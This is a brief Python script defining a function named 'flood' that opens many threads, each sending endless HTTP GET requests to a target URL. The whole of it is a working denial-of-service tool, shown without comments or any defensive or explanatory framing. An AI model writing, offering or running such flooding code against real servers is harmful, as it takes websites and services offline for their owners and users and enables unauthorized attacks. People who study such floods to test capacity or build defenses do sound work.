import requests
from threading import Thread

def flood(target, thread_count):
    def make_request():
        while True:
            requests.get(target)

    for _ in range(thread_count):
        thread = Thread(target=make_request)
        thread.start()
